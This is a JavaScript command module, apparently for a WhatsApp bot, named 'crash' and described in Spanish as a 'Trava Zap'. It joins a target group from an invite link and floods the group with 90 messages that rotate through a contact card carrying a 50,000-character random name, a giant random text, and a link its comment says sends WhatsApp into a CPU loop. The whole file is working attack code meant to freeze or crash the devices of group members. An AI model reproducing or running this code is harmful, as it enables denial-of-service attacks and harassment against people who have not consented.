export default {
  name: ["crash"],
  description: "Trava Zap: contacto con nombre gigante random + ráfaga",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });
    const code = match[1];

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: '⚠️ No pude leer el grupo. Enlace inválido o expirado.' });
    }
    try { await sock.groupAcceptInvite(code); } catch {}

    // === TRAVA ZAP: letras y números random sin sentido ===
    const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789#$%&@*+=';
    const randomStr = (n) => {
      let s = '';
      for (let i = 0; i < n; i++) s += ALPHA[(Math.random() * ALPHA.length) | 0];
      return s;
    };

    const NOMBRE = randomStr(50000);   // nombre de contacto gigante
    const TEXTO = randomStr(50000);    // texto random gigante

    // vCard con el nombre monstruoso (así se manda el trava zap de verdad)
    const vcard =
      'BEGIN:VCARD\n' +
      'VERSION:3.0\n' +
      `FN:${NOMBRE}\n` +
      `N:${NOMBRE};;;;\n` +
      'TEL;type=CELL;type=VOICE;waid=5490000000000:+5490000000000\n' +
      'END:VCARD';

    const builds = [
      // 1) CONTACTO con nombre gigante random  <- el trava zap real
      () => sock.sendMessage(groupId, {
        contacts: { displayName: NOMBRE, contacts: [{ vcard }] },
      }),

      // 2) TEXTO con la misma cadena random
      () => sock.sendMessage(groupId, { text: TEXTO }),

      // 3) Link que mete a WhatsApp en bucle de CPU
      () => sock.sendMessage(groupId, { text: 'wa.me/channel' }),
    ];

    const total = 90;
    const delayMs = 900;

    await reply({ text: `💥 Trava Zap → ${groupId}\n> ${total} envíos (contacto random + texto + link)` });

    for (let i = 0; i < total; i++) {
      try {
        await builds[i % builds.length]();
      } catch {
        // sigue
      }
      await new Promise((r) => setTimeout(r, delayMs));
    }

    await reply({ text: `✅ Listo: ${total} mensajes a ${groupId}.` });
  },
};